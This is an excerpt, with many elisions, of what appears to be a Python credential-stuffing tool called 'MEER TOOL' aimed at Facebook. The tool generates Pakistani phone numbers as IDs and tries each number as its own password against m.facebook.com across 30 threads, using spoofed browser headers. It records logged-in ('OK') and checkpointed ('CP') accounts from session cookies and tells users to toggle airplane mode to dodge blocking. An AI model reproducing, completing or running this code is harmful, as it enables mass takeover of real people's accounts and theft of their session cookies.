...
..:::::..::........::........::..:::::..::
\033[1;37m=============================================================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mABU BAKAR\33[0;m\033[1;32m && \033[1;33mMEER\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34mDALAL JANI
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\r\033[1;32m[MEER-OK] '+cid+' | '+ps)
				cek_apk(coki)
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[MEER-CP] '+cid+' | '+ps)
				...
				continue
		loop+=1
		sys.stdout.write(f"\r\x1b[1;32m[MEER-MEER]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [CP][{len(cps)}] ")
		sys.stdout.flush()
	except:
		pass
...
def random_pak_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] MEER TOOL Has been started...(\033[1;92mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
...
def rcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
          ...
          'cache-control': 'max-age=0',
          'referer': 'https://m.facebook.com/?stype=lo&jlou=AfdfhfRaobXJln95oL0JRJ_y7_5G8sw33_pMPbbnNQV3qH9jxST3YrCL5Ywm2Vu8SS4iscpyA7QmJKCsBAfmRMgVz38IraHJ7B_hXtpq94DQiw&smuh=19439&lh=Ac-1YDPyzAnMlyIKLNE&_rdr',
          ...
          'user-agent': pro}
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[ MEER ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass
menu_apikey()
